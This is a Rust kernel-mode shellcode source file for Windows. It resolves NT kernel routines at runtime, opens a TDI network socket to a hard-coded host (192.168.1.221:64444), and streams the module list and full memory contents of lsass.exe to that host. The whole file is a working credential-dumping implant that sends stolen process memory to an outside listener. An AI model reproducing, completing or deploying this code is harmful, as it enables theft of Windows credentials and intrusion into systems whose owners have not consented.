#![no_std]
#![feature(asm)]
#![feature(core_intrinsics)]

#[repr(u32)]
enum ScrapeType {
    Module = 0,
    Memory = 1,
}

#[repr(C, packed)]
struct ScrapeInfo {
    scrape_type: ScrapeType,
    size: u32,
    address: u64,
}

#[no_mangle]
unsafe extern "stdcall"
fn _DllMainCRTStartup(
    _hinst_dll: *const u8,
    _fdw_reason: u32,
    _lpv_reserved: *const u8
) -> u64
{
    match shellcode_start() {
        Ok(_) => 0,
        Err(x) => x as _,
    }
}

unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {

    let nt_base = resolver::find_nt_base_address();
    let ex_allocate_pool: ntdef::functions::ExAllocatePool = ntproc::find!("ExAllocatePool");

    let tdi_ctx: *mut nttdi::TdiContext = ex_allocate_pool(
        ntdef::enums::POOL_TYPE::NonPagedPool,
        core::mem::size_of::<nttdi::TdiContext>()
    ) as _;

    let mem_funcs: *mut ntmem::MemDumpFuncs = ex_allocate_pool(
        ntdef::enums::POOL_TYPE::NonPagedPool,
        core::mem::size_of::<ntmem::MemDumpFuncs>()
    ) as _;

    (*tdi_ctx).funcs.ex_allocate_pool =                     ex_allocate_pool;
    (*tdi_ctx).funcs.ex_free_pool_with_tag =                ntproc::find!("ExFreePoolWithTag");
    (*tdi_ctx).funcs.io_allocate_mdl =                      ntproc::find!("IoAllocateMdl");
    (*tdi_ctx).funcs.io_build_device_io_control_request =   ntproc::find!("IoBuildDeviceIoControlRequest");
    (*tdi_ctx).funcs.io_get_related_device_object =         ntproc::find!("IoGetRelatedDeviceObject");
    (*tdi_ctx).funcs.iof_call_driver =                      ntproc::find!("IofCallDriver");
    (*tdi_ctx).funcs.ke_initialize_event =                  ntproc::find!("KeInitializeEvent");
    (*tdi_ctx).funcs.ke_wait_for_single_object =            ntproc::find!("KeWaitForSingleObject");
    (*tdi_ctx).funcs.ob_reference_object_by_handle =        ntproc::find!("ObReferenceObjectByHandle");
    (*tdi_ctx).funcs.zw_create_file =                       ntproc::find!("ZwCreateFile");
    (*tdi_ctx).funcs.mm_probe_and_lock_pages =              ntproc::find!("MmProbeAndLockPages");

    (*mem_funcs).ke_stack_attach_process =                  ntproc::find!("KeStackAttachProcess");
    (*mem_funcs).ke_unstack_detach_process =                ntproc::find!("KeUnstackDetachProcess");
    (*mem_funcs).mm_secure_virtual_memory =                 ntproc::find!("MmSecureVirtualMemory");
    (*mem_funcs).mm_unsecure_virtual_memory =               ntproc::find!("MmUnsecureVirtualMemory");
    (*mem_funcs).obf_dereference_object =                   ntproc::find!("ObfDereferenceObject");
    (*mem_funcs).ps_get_process_image_file_name =           ntproc::find!("PsGetProcessImageFileName");
    (*mem_funcs).ps_lookup_process_by_process_id =          ntproc::find!("PsLookupProcessByProcessId");
    (*mem_funcs).zw_query_information_process =             ntproc::find!("ZwQueryInformationProcess");
    (*mem_funcs).zw_query_virtual_memory =                  ntproc::find!("ZwQueryVirtualMemory");

    let rtl_get_version: ntdef::functions::RtlGetVersion =  ntproc::find!("RtlGetVersion");

    use nttdi::Socket;
    let mut socket = nttdi::TdiSocket::new(tdi_ctx);
    socket.add_recv_handler(recv_handler);
    socket.connect(0xdd01a8c0, 0xBCFB)?;  // 192.168.1.221:64444

    let mut version: ntdef::structs::RTL_OSVERSIONINFOW = core::mem::MaybeUninit::uninit().assume_init();
    version.dwOSVersionInfoSize = core::mem::size_of_val(&version) as _;

    rtl_get_version(&mut version as *mut _ as _);

    let _ = socket.send(&version as *const _ as _, core::mem::size_of_val(&version) as _);
    
    let mut memdump = ntmem::MemoryDumper::new(mem_funcs, ntstr::fnv1a_32_hash!("lsass.exe"))?;

    loop {
        let (address, size, nameptr) = match memdump.next_module() {
            Ok(x) => x,
            Err(_) => break
        };

        let region_info = ScrapeInfo { scrape_type: ScrapeType::Module, address: address as _, size: size as _ };
        let _ = socket.send(&region_info as *const _ as _, core::mem::size_of_val(&region_info) as _);
        let _ = socket.send(nameptr as _, 100);
    }

    loop {
        let (address, size) = match memdump.next_range() {
            Ok(x) => x,
            Err(_) => break
        };

        let region_info = ScrapeInfo { scrape_type: ScrapeType::Memory, address: address as _, size: size as _ };
        let _ = socket.send(&region_info as *const _ as _, core::mem::size_of_val(&region_info) as _);
        let _ = socket.send(address as _, size as _);
    }

    Ok(())
}

// called at DISPATCH_LEVEL
unsafe fn recv_handler(
    _tdi_event_context:      ntdef::types::PVOID,
    _connection_context:     ntdef::types::PVOID,
    _receive_flags:          ntdef::types::ULONG,
    _bytes_indicated:        ntdef::types::ULONG,
    bytes_available:        ntdef::types::ULONG,
    bytes_taken:            *mut ntdef::types::ULONG,
    _buffer:                 ntdef::types::PVOID,
    irp:                    *mut ntdef::structs::PIRP,
) -> ntdef::types::NTSTATUS {
    //core::intrinsics::breakpoint();

    *bytes_taken = bytes_available;
    *irp = core::ptr::null_mut();

    ntdef::enums::NTSTATUS::STATUS_SUCCESS as _
}


#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {
    }
}
